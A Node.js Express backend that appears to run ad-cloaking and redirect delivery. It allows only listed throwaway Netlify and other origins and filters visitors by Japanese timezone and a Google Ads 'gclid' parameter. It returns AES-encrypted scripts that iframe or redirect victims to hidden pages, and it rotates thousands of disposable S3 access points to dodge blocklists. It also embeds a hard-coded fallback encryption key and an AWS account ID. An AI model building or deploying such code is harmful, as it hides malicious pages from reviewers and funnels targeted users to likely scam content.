require("dotenv").config();
const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");
const { v4: uuidv4 } = require("uuid");
const Redis = require("ioredis");
const {
  S3Client,
  GetObjectCommand,
  HeadObjectCommand,
} = require("@aws-sdk/client-s3");
const {
  S3ControlClient,
  CreateAccessPointCommand,
  DeleteAccessPointCommand,
  ListAccessPointsCommand,
} = require("@aws-sdk/client-s3-control");
const { getSignedUrl } = require("@aws-sdk/s3-request-presigner");

// ─── Config ───────────────────────────────────────────────────────
const ENCRYPTION_KEY =
  process.env.ENCRYPTION_KEY ||
  "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";
const PORT = process.env.PORT || 3000;
const REGION = process.env.AWS_REGION || "ap-northeast-1";
const ACCOUNT_ID = process.env.AWS_ACCOUNT_ID || "654654618464";
const BUCKET_NAME = process.env.BUCKET_NAME;
const OBJECT_KEY = process.env.OBJECT_KEY || "index.html";

const BATCH_SIZE = 3000;
const TOPUP_THRESHOLD = 300;
const PRESIGN_EXPIRY_SECONDS = 3600;
const TOPUP_LOCK_TTL_SECONDS = 120;
const LOCK_REFRESH_INTERVAL_MS = 30_000;
const TOPUP_CONCURRENCY = 10;
const POP_MAX_TRIES = 5;
const READINESS_MAX_MS = 60_000;

// ─── Redis keys ───────────────────────────────────────────────────
const KEY_UNUSED = "aps:unused";
const KEY_USED = "aps:used";
const KEY_BATCHES = "aps:batches";
const KEY_TOPUP_LOCK = "aps:topup_lock";
const keyBatchMembers = (id) => `aps:batch:${id}:members`;
const keyBatchRemaining = (id) => `aps:batch:${id}:remaining`;

// ─── Clients ──────────────────────────────────────────────────────
const s3Client = new S3Client({ region: REGION });
const s3Control = new S3ControlClient({ region: REGION });
const redis = new Redis(process.env.REDIS_URL);
redis.on("error", (err) => console.error("Redis error:", err.message));

// ─── Origin groups ────────────────────────────────────────────────
// Each origin maps to { method, target }. `method` selects which
// buildPayload handler runs (see BUILD_PAYLOAD_HANDLERS below):
//   - "iframe":   embed `target` in an iframe
//   - "redirect": window.location.replace(target)
//   - "s3ap":     pop a unique presigned URL from the AP pool and
//                 redirect to it (target is ignored)
const ORIGIN_GROUPS = {
  rocky: {
    "https://cheery-douhua-d9bd03.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
    "https://cozy-kheer-cea1f9.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
    "https://lambent-maamoul-1de7b2.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
    "https://nimble-bonbon-e8f851.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
    "https://spontaneous-salamander-ec6bf0.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
    "https://benevolent-lebkuchen-4f36c6.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
    "https://earnest-sawine-a7ac5c.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
    "https://relaxed-pegasus-8e3b77.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
  },
  dmc: {
    "https://miyabikinjp.dqwzavw2upc3z.amplifyapp.com": { method: "iframe", target: "https://relaxed-fenglisu-a78984.netlify.app" },
  },
  aomine: {
    "https://zen-hawellness.life": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app/aomine.html" },
  },
};

function lookupOrigin(origin) {
  for (const [group, entries] of Object.entries(ORIGIN_GROUPS)) {
    if (entries[origin]) return { group, ...entries[origin] };
  }
  return null;
}

const JAPANESE_TIMEZONES = new Set([
  "Asia/Tokyo",
  "Japan",
  "JST",
  "GMT+9",
  "UTC+9",
  "+09:00",
  "+0900",
]);

const app = express();
app.use(cors());
app.use(express.json());

function isJapaneseTimezone(tz) {
  if (!tz || typeof tz !== "string") return false;

  const normalized = tz.trim();

  if (JAPANESE_TIMEZONES.has(normalized)) return true;

  try {
    const fmt = new Intl.DateTimeFormat("en", {
      timeZone: normalized,
      timeZoneName: "shortOffset",
    });
    const offsetPart = fmt
      .formatToParts(new Date())
      .find((p) => p.type === "timeZoneName");

    if (offsetPart) {
      const raw = offsetPart.value.replace("GMT", "").replace(":", "");
      const hours = parseInt(raw, 10);
      if (hours === 9) return true;
    }
  } catch {
    // Unknown timezone string — fall through to false
  }

  return false;
}

function hasGclid(fullUrl) {
  if (!fullUrl || typeof fullUrl !== "string") return false;
  try {
    const url = new URL(fullUrl);
    const gclid = url.searchParams.get("gclid");
    return typeof gclid === "string" && gclid.length > 0;
  } catch {
    return false;
  }
}

// ─── AP pool helpers ──────────────────────────────────────────────

async function listAllAccessPoints() {
  const names = [];
  let NextToken;
  do {
    const resp = await s3Control.send(
      new ListAccessPointsCommand({
        AccountId: ACCOUNT_ID,
        Bucket: BUCKET_NAME,
        MaxResults: 1000,
        NextToken,
      }),
    );
    for (const ap of resp.AccessPointList || []) names.push(ap.Name);
    NextToken = resp.NextToken;
  } while (NextToken);
  return names;
}

async function deleteManyAccessPoints(names) {
  let failed = 0;
  for (const name of names) {
    try {
      await s3Control.send(
        new DeleteAccessPointCommand({ AccountId: ACCOUNT_ID, Name: name }),
      );
    } catch (err) {
      if (err.name === "NoSuchAccessPoint") continue;
      failed++;
      console.error(`[AP] delete failed for ${name}: ${err.name || err.message}`);
    }
  }
  return names.length - failed;
}

// Ownership-checked Lua scripts so a stale-but-expired lock holder can never
// extend or release someone else's lock.
const SCRIPT_REFRESH_LOCK = `
if redis.call("get", KEYS[1]) == ARGV[1] then
  return redis.call("expire", KEYS[1], ARGV[2])
else
  return 0
end
`;

const SCRIPT_RELEASE_LOCK = `
if redis.call("get", KEYS[1]) == ARGV[1] then
  return redis.call("del", KEYS[1])
else
  return 0
end
`;

async function withTopupLock(label, fn) {
  const token = `${label}-${uuidv4()}`;
  const got = await redis.set(
    KEY_TOPUP_LOCK,
    token,
    "EX",
    TOPUP_LOCK_TTL_SECONDS,
    "NX",
  );
  if (!got) return { acquired: false };

  const refresher = setInterval(() => {
    redis
      .eval(SCRIPT_REFRESH_LOCK, 1, KEY_TOPUP_LOCK, token, TOPUP_LOCK_TTL_SECONDS)
      .catch(() => {});
  }, LOCK_REFRESH_INTERVAL_MS);

  try {
    const result = await fn();
    return { acquired: true, result };
  } finally {
    clearInterval(refresher);
    await redis
      .eval(SCRIPT_RELEASE_LOCK, 1, KEY_TOPUP_LOCK, token)
      .catch(() => {});
  }
}

// Probe an AP via HeadObject until S3 returns 200 (or a definitive 404 — which
// proves the AP itself works, the object just isn't there). Used at the end of
// top-up to make sure the freshest APs have propagated before we expose them.
async function waitForApReady(name, maxMs = READINESS_MAX_MS) {
  const apArn = `arn:aws:s3:${REGION}:${ACCOUNT_ID}:accesspoint/${name}`;
  const start = Date.now();
  let delay = 500;
  while (Date.now() - start < maxMs) {
    try {
      await s3Client.send(
        new HeadObjectCommand({ Bucket: apArn, Key: OBJECT_KEY }),
      );
      return true;
    } catch (err) {
      const status = err.$metadata?.httpStatusCode;
      if (status === 404 || err.name === "NotFound") return true;
      await new Promise((r) => setTimeout(r, delay));
      delay = Math.min(delay * 2, 4000);
    }
  }
  return false;
}

// Retire any batches at the head of the queue whose remaining counter is 0.
// Deletes their AWS APs in the background.
async function retireExhaustedBatches() {
  while (true) {
    const oldestId = await redis.lindex(KEY_BATCHES, 0);
    if (!oldestId) return;
    const remaining = Number(
      (await redis.get(keyBatchRemaining(oldestId))) || 0,
    );
    if (remaining > 0) return;

    const members = await redis.smembers(keyBatchMembers(oldestId));
    const tx = redis.multi();
    tx.lpop(KEY_BATCHES);
    tx.del(keyBatchMembers(oldestId));
    tx.del(keyBatchRemaining(oldestId));
    if (members.length > 0) tx.srem(KEY_USED, ...members);
    await tx.exec();

    console.log(
      `[retire] batch ${oldestId}: queuing ${members.length} APs for AWS delete`,
    );
    if (members.length > 0) {
      deleteManyAccessPoints(members).catch((e) =>
        console.error("[retire] delete:", e),
      );
    }
  }
}

let topupRunning = false;

async function runTopUp() {
  if (topupRunning) return;
  topupRunning = true;
  try {
    const lockResult = await withTopupLock("topup", async () => {
      const unused = await redis.llen(KEY_UNUSED);
      if (unused > TOPUP_THRESHOLD) {
        console.log(
          `[topUp] unused=${unused} above threshold=${TOPUP_THRESHOLD}; skipping`,
        );
        return { skipped: true };
      }

      const batchId = Date.now().toString();
      console.log(
        `[topUp] creating batch ${batchId}: ${BATCH_SIZE} APs (concurrency=${TOPUP_CONCURRENCY})…`,
      );

      const start = Date.now();
      const created = [];
      const failures = [];
      let nextI = 1;
      let progress = 0;

      async function worker() {
        while (true) {
          const i = nextI++;
          if (i > BATCH_SIZE) return;
          const name = `ap-${batchId}-${uuidv4().split("-")[0]}-${i}`;
          try {
            await s3Control.send(
              new CreateAccessPointCommand({
                AccountId: ACCOUNT_ID,
                Name: name,
                Bucket: BUCKET_NAME,
              }),
            );
            created.push(name);
          } catch (err) {
            failures.push({ name, err: err.name || err.message });
            console.error(`[topUp] create failed (${name}): ${err.name || err.message}`);
          }
          progress++;
          if (progress % 200 === 0) {
            console.log(`[topUp] progress: ${progress}/${BATCH_SIZE}`);
          }
        }
      }

      await Promise.all(
        Array.from({ length: TOPUP_CONCURRENCY }, () => worker()),
      );

      if (created.length === 0) {
        console.error("[topUp] all creates failed");
        return { skipped: false, created: 0, failed: failures.length };
      }

      // Wait for the most-recently-created AP to propagate. Earlier APs were
      // created earlier and have had even longer to become serviceable.
      const probeName = created[created.length - 1];
      const probeStart = Date.now();
      const ready = await waitForApReady(probeName, READINESS_MAX_MS);
      const probeSecs = ((Date.now() - probeStart) / 1000).toFixed(1);
      if (ready) {
        console.log(`[topUp] readiness probe ok in ${probeSecs}s`);
      } else {
        console.warn(
          `[topUp] readiness probe timed out after ${probeSecs}s; pushing anyway (pop-time probe will catch stragglers)`,
        );
      }

      const tx = redis.multi();
      tx.sadd(keyBatchMembers(batchId), ...created);
      tx.set(keyBatchRemaining(batchId), created.length);
      tx.rpush(KEY_UNUSED, ...created);
      tx.rpush(KEY_BATCHES, batchId);
      const results = await tx.exec();

      if (!results) {
        console.error(
          `[topUp] Redis MULTI aborted; rolling back ${created.length} AWS APs`,
        );
        deleteManyAccessPoints(created).catch((e) =>
          console.error("[topUp] rollback delete:", e),
        );
        return { skipped: false, created: 0, rolledBack: created.length };
      }
      const partialErrors = results
        .filter(([err]) => err)
        .map(([err]) => err.message);
      if (partialErrors.length) {
        console.error(
          `[topUp] Redis MULTI partial failure (${partialErrors.join("; ")}); rolling back ${created.length} AWS APs`,
        );
        deleteManyAccessPoints(created).catch((e) =>
          console.error("[topUp] rollback delete:", e),
        );
        return { skipped: false, created: 0, rolledBack: created.length };
      }

      const secs = ((Date.now() - start) / 1000).toFixed(1);
      console.log(
        `[topUp] batch ${batchId}: ${created.length}/${BATCH_SIZE} live, ${failures.length} failed, ${secs}s`,
      );
      return {
        skipped: false,
        created: created.length,
        failed: failures.length,
      };
    });

    if (!lockResult.acquired) {
      console.log("[topUp] another worker holds the lock; skipping");
    }
  } catch (err) {
    console.error("[topUp] error:", err);
  } finally {
    topupRunning = false;
  }
}

function maybeTriggerTopUp() {
  redis
    .llen(KEY_UNUSED)
    .then((n) => {
      if (n <= TOPUP_THRESHOLD && !topupRunning) {
        runTopUp().catch((e) => console.error("[topUp] bg:", e));
      }
    })
    .catch(() => {});
}

async function decrementOwningBatch(name) {
  const ids = await redis.lrange(KEY_BATCHES, 0, -1);
  for (const id of ids) {
    const isMember = await redis.sismember(keyBatchMembers(id), name);
    if (isMember) {
      const remaining = await redis.decr(keyBatchRemaining(id));
      if (remaining <= 0) {
        retireExhaustedBatches().catch((e) =>
          console.error("[retire]:", e),
        );
      }
      return;
    }
  }
}

// Drop a name we believe is dead from the pool's bookkeeping. Same accounting
// as a normal pop (decrements the owning batch counter so retirement still
// progresses), but skips the KEY_USED add and best-effort deletes the AP from
// AWS in case it actually exists in a broken state.
async function dropDeadAp(name, reason) {
  console.warn(`[pool] dropping AP ${name}: ${reason}`);
  await decrementOwningBatch(name);
  s3Control
    .send(new DeleteAccessPointCommand({ AccountId: ACCOUNT_ID, Name: name }))
    .catch(() => {});
}

async function nextPresignedUrl() {
  for (let attempt = 0; attempt < POP_MAX_TRIES; attempt++) {
    const name = await redis.lpop(KEY_UNUSED);
    if (!name) {
      // Pool dry — kick off an emergency topup and bail.
      runTopUp().catch((e) => console.error("[topUp] emergency:", e));
      return null;
    }

    const apArn = `arn:aws:s3:${REGION}:${ACCOUNT_ID}:accesspoint/${name}`;

    // Validate the AP is alive before issuing a URL. Self-heals stale Redis
    // entries (deleted from AWS, broken policy, never propagated, etc.).
    try {
      await s3Client.send(
        new HeadObjectCommand({ Bucket: apArn, Key: OBJECT_KEY }),
      );
    } catch (err) {
      const status = err.$metadata?.httpStatusCode;
      // 404 means the AP works but the object is missing — that's a config
      // issue, not a dead AP. Fall through and serve the URL anyway.
      if (status !== 404 && err.name !== "NotFound") {
        await dropDeadAp(name, `${err.name || "ProbeFailed"} (${status || "?"})`);
        maybeTriggerTopUp();
        continue;
      }
    }

    const presigned = await getSignedUrl(
      s3Client,
      new GetObjectCommand({ Bucket: apArn, Key: OBJECT_KEY }),
      { expiresIn: PRESIGN_EXPIRY_SECONDS },
    );

    await redis.sadd(KEY_USED, name);
    await decrementOwningBatch(name);
    maybeTriggerTopUp();
    return presigned;
  }
  console.warn(
    `[pool] gave up after ${POP_MAX_TRIES} stale APs in a row; pool may be poisoned`,
  );
  return null;
}

async function boot() {
  // Hold the top-up lock for the orphan sweep so a concurrent runTopUp can't
  // be creating APs in AWS while we classify "untracked AWS APs" as orphans
  // and delete them. Without this, the boot sweep can race a top-up's MULTI
  // and end up deleting APs that get RPUSHed into Redis seconds later.
  const lockResult = await withTopupLock("boot", async () => {
    try {
      const awsNames = await listAllAccessPoints();
      const batchIds = await redis.lrange(KEY_BATCHES, 0, -1);
      const tracked = new Set();
      for (const id of batchIds) {
        const mems = await redis.smembers(keyBatchMembers(id));
        mems.forEach((n) => tracked.add(n));
      }
      const orphans = awsNames.filter((n) => !tracked.has(n));
      if (orphans.length) {
        console.log(`[boot] cleaning ${orphans.length} orphan APs from AWS`);
        await deleteManyAccessPoints(orphans);
      } else {
        console.log("[boot] no orphan APs");
      }
    } catch (err) {
      console.error("[boot] cleanup failed:", err.message);
    }
  });

  if (!lockResult.acquired) {
    console.log(
      "[boot] top-up lock held; skipping orphan sweep (pop-time probe will self-heal stale entries)",
    );
  }

  // runTopUp acquires the lock itself, so this must happen after boot's lock
  // is released.
  const unused = await redis.llen(KEY_UNUSED);
  if (unused <= TOPUP_THRESHOLD) {
    console.log(`[boot] unused=${unused}; bootstrapping pool…`);
    await runTopUp();
  } else {
    console.log(`[boot] pool ready: ${unused} unused APs`);
  }
}

// ─── buildPayload variants ────────────────────────────────────────

function buildPayloadIframe(targetUrl) {
  return `const iframe = document.createElement("iframe");
iframe.src = "${targetUrl}";

iframe.setAttribute(
  "allow",
  "fullscreen; autoplay; encrypted-media; picture-in-picture",
);

iframe.setAttribute("allowfullscreen", "");
iframe.setAttribute("webkitallowfullscreen", "");
iframe.setAttribute("mozallowfullscreen", "");

iframe.setAttribute(
  "sandbox",
  "allow-scripts allow-popups allow-forms allow-downloads",
);

iframe.style.width = "100%";
iframe.style.height = "100%";
iframe.style.border = "0px";

const container = document.getElementById("contentiframe");
if (container) {
  container.replaceChildren(iframe);
}`;
}

function buildPayloadRedirect(targetUrl) {
  return `window.location.replace(${JSON.stringify(targetUrl)});`;
}

const BUILD_PAYLOAD_HANDLERS = {
  iframe: async (entry) => buildPayloadIframe(entry.target),
  redirect: async (entry) => buildPayloadRedirect(entry.target),
  s3ap: async () => {
    const presigned = await nextPresignedUrl();
    if (!presigned) return null;
    return buildPayloadRedirect(presigned);
  },
};

// ─── Routes ───────────────────────────────────────────────────────

app.post("/timezone", async (req, res) => {
  const { timezone, fullUrl } = req.body || {};
  const origin = req.headers.origin;

  const entry = origin ? lookupOrigin(origin) : null;
  if (!entry) {
    return res.status(403).json({ error: "Origin not allowed" });
  }

  if (!isJapaneseTimezone(timezone)) {
    return res
      .status(400)
      .json({ error: "Timezone is not a Japanese timezone (JST / UTC+9)" });
  }

  if (!hasGclid(fullUrl)) {
    return res
      .status(400)
      .json({ error: "fullUrl is missing gclid parameter" });
  }

  const handler = BUILD_PAYLOAD_HANDLERS[entry.method];
  if (!handler) {
    console.error(`[timezone] unknown method "${entry.method}" for ${origin}`);
    return res.status(500).json({ error: "Server misconfiguration" });
  }

  let payload;
  try {
    payload = await handler(entry);
  } catch (err) {
    console.error(`[timezone] handler error (${entry.method}):`, err.message);
    return res.status(500).json({ error: "Payload build failed" });
  }
  if (!payload) {
    return res.status(503).json({ error: "Pool empty — try again" });
  }

  const encrypted = encodeURIComponent(
    CryptoJS.AES.encrypt(payload, ENCRYPTION_KEY).toString(),
  );

  console.log(`Popup Sent [${entry.group}/${entry.method}] ${origin}`);
  return res.status(200).type("text/plain").send(encrypted);
});

app.get("/health", (_req, res) => res.json({ status: "ok" }));

app.get("/status", async (_req, res) => {
  try {
    const [unused, used, batchIds, lockVal, lockTtl] = await Promise.all([
      redis.llen(KEY_UNUSED),
      redis.scard(KEY_USED),
      redis.lrange(KEY_BATCHES, 0, -1),
      redis.get(KEY_TOPUP_LOCK),
      redis.ttl(KEY_TOPUP_LOCK),
    ]);
    const batches = [];
    for (const id of batchIds) {
      const [size, remaining] = await Promise.all([
        redis.scard(keyBatchMembers(id)),
        redis.get(keyBatchRemaining(id)),
      ]);
      batches.push({ id, size, remaining: Number(remaining || 0) });
    }
    res.json({
      unused,
      used,
      batches,
      topupRunning,
      topupLock: lockVal ? { value: lockVal, ttlSeconds: lockTtl } : null,
      config: { BATCH_SIZE, TOPUP_THRESHOLD, PRESIGN_EXPIRY_SECONDS },
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Manual top-up trigger. ?force=1 clears any stale lock + in-memory flag first.
app.post("/admin/topup", async (req, res) => {
  const force = req.query.force === "1";
  if (force) {
    await redis.del(KEY_TOPUP_LOCK).catch(() => {});
    topupRunning = false;
  }
  runTopUp().catch((e) => console.error("[topUp] manual:", e));
  res.status(202).json({ triggered: true, forced: force });
});

// Full reset: wipe all pool-related Redis keys + delete every AP in the
// bucket. Holds the top-up lock so a concurrent top-up can't keep writing
// names into Redis (or APs into AWS) while we're nuking. ?force=1 clears
// any stale lock first.
app.post("/admin/reset", async (req, res) => {
  try {
    if (req.query.force === "1") {
      await redis.del(KEY_TOPUP_LOCK).catch(() => {});
      topupRunning = false;
    }

    const lockResult = await withTopupLock("reset", async () => {
      const awsNames = await listAllAccessPoints();
      console.log(`[reset] deleting ${awsNames.length} APs from AWS…`);
      if (awsNames.length) await deleteManyAccessPoints(awsNames);

      const batchIds = await redis.lrange(KEY_BATCHES, 0, -1);
      const tx = redis.multi();
      tx.del(KEY_UNUSED);
      tx.del(KEY_USED);
      tx.del(KEY_BATCHES);
      for (const id of batchIds) {
        tx.del(keyBatchMembers(id));
        tx.del(keyBatchRemaining(id));
      }
      await tx.exec();
      return { awsDeleted: awsNames.length, batchesCleared: batchIds.length };
    });

    if (!lockResult.acquired) {
      return res.status(409).json({
        error: "Top-up in progress; retry shortly or POST with ?force=1",
      });
    }

    topupRunning = false;
    res.json({
      reset: true,
      ...lockResult.result,
      note: "Now POST /admin/topup to rebuild the pool.",
    });
  } catch (err) {
    console.error("[reset] error:", err);
    res.status(500).json({ error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  for (const [group, entries] of Object.entries(ORIGIN_GROUPS)) {
    console.log(`  [${group}] ${Object.keys(entries).length} origins`);
  }
  boot().catch((e) => console.error("[boot] fatal:", e));
});
